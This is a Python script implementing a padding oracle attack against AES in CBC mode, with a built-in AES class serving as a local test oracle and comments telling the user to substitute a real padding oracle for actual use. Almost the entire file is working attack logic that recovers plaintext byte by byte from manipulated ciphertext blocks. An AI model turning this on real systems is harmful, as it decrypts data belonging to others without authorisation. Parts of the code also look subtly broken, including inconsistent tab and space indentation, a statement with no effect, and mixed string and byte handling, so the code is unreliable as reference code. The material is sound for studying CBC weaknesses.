"""
Padding Oracle attack code.
AES Implementation included for testing.
For use, replace 'cryptmaster.decrypt()' call with your own padding oracle.
Notes: Works on CBC mode encryption.
"""
# For Testing:
from Crypto.Cipher import AES
from Crypto import Random
# For base conversions:
import base64
import codecs

# Block Size (In bytes):
BS = 16

"""
For testing code block.
This is the Enc/Dec scheme we use as a padding oracle for testing:
"""
# padding function for AES mode (PKCS5):
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)

# unpadding function:


def unpad(s):
    pad = s[len(s)-1]
    if(pad<=0 or pad > len(s)):
        return False
    for i in s[len(s)-pad:]:
        if i!=pad:
            return False
    return s[:len(s)-pad]

# AES cipher class.


class AESCipher:
    def __init__( self, key ):
        """
        Requires hex encoded param as a key
        """
        self.key = codecs.decode(key, 'hex_codec')

    def encrypt( self, raw ):
        """
        Returns hex encoded encrypted value!
        """
        raw = pad(raw)
        iv = Random.new().read(AES.block_size);
        cipher = AES.new( self.key, AES.MODE_CBC, iv )
        return codecs.encode(( iv + cipher.encrypt( raw ) ), 'hex_codec')

    def decrypt( self, enc ):
        """
        Requires hex encoded param to decrypt
        """
        enc = codecs.decode(enc, 'hex_codec')
        iv = enc[:16]
        enc= enc[16:]
        cipher = AES.new(self.key, AES.MODE_CBC, iv )
        plaintext = cipher.decrypt( enc)
        return unpad(plaintext)

"""
Function deciphers a single given byte in the block:
Inputs:
    byteIndex = place of byte to be deciphered inside block (between 0 and 15)
    cipherBlock  = the cipher block which we are decrypting.
    prevCipherBlock = the previous cipher block (for the first cipher block, this is the IV).
    decipheredBytes = list of already known values of all bytes after the requested one in the block
    blockSize = size of block
Output:
    the deciphered value of the byte (as int)
"""


def decipherByte(byteIndex,cipherBlock,prevCipherBlock,decipheredBytes=[],blockSize = 16):
    
    # initialize run variables:
    didTwoBytesWork = False
    tailBytes = bytearray()
    i = 1
    
    # append the correct padding to all bytes after the one we are deciphering:
    for b in decipheredBytes:
        tailBytes = tailBytes + bytearray([b^int(prevCipherBlock[(byteIndex+i)*2:(byteIndex+i)*2+2],16)^(blockSize-byteIndex)]*1)
        i = i+1

    # the ciphertext byte we are manipulating:
    byteToManipulate = prevCipherBlock[byteIndex*2:((byteIndex*2)+2)]

    # run on all options for value:
    for i in range(0,256):
        
        # change value of manipulated cipher text:
        blockToManipulate = prevCipherBlock
        blockToManipulate = blockToManipulate[:(byteIndex*2)]
        blockToManipulate = codecs.decode(blockToManipulate, 'hex_codec')
        blockToManipulate = blockToManipulate+bytearray([i]*1)+tailBytes
        blockToManipulate = codecs.encode(blockToManipulate, 'hex_codec')
        
        # send to padding oracle:
        cipherTry = blockToManipulate + cipherBlock
        result = cryptmaster.decrypt(cipherTry)

        # when padding oracle returns true, we know that he believes message to have correct padding:
        if(result != False):

            # set deciphered byte to correct value:
            if( blockToManipulate[byteIndex*2:(byteIndex*2)+2] != byteToManipulate ):

                # if not only the original padding worked:
                didTwoBytesWork = True
                decipheredByte = i^(blockSize-byteIndex)^int(byteToManipulate,16)
                return decipheredByte
            else:
                decipheredByte = i^(blockSize-byteIndex)^int(byteToManipulate,16)

    # return result:
    return decipheredByte

"""
deciphers an entire block:
Inputs:
    cipherBlock = block to be deciphered.
    prevCipherBlock = the previous cipher block (for the first cipher block, this is the IV).
Output:
    plaintext string of this block:
"""
def decipherBlock(cipherBlock , prevCipherBlock, entireCiphertext):
    messageBytes = []
    message = ""
    #run on all bytes in block,from start to end, deciphering:
    for i in range(0,BS):
        byteD = decipherByte(BS-1-i,cipherBlock,prevCipherBlock,messageBytes)
        messageBytes.insert(0,byteD)
        message = chr(byteD)+message
        if i == 0:
            entireCiphertext = entireCiphertext[:-1] + chr(byteD)
        if i == BS-1:
            chr(byteD) + entireCiphertext[1:]
        else:
            entireCiphertext = entireCiphertext[:-i-1] + chr(byteD) + entireCiphertext[-i+1:]
        print("deciphered byte " + str(i) + " : " + entireCiphertext)
    return message

"""
Main Operation:
"""
if __name__== "__main__":
    """
         For actual use, delete following block,define 'ciphertext' to be your ciphertext,
         and replace all calls to 'cryptmaster.decipher()' in code to your padding oracle.
    """
    
    # beginning of test code:
    key = "140b41b22a29beb4061bda66b6747e14"
    plaintext = "This attack completely breaks any block cipher using CBC mode, given a padding oracle." \
                " Implementation should be switched to more secure modes, such as CTR."
    key=key[:32]
    cryptmaster = AESCipher(key)
    ciphertext = cryptmaster.encrypt(plaintext)
    # end of test block.

    # -----------------------------------------------------------------------------------#
    # the attack:                                                                        #
    # -----------------------------------------------------------------------------------#

    # split cipher to blocks:
    cipherBlocks = [ciphertext[i:i+BS*2] for i in range(0, len(ciphertext), BS*2)]
    message = ""
    ciphertext = str(ciphertext)
    
    # go block by block, deciphering and appending to message:
    for i in range(0,len(cipherBlocks)-1):
    	newBlock = decipherBlock(cipherBlocks[i+1],cipherBlocks[i],ciphertext)
        #print(ciphertext)
    	message = message + newBlock
    # output of message:
    print (message)
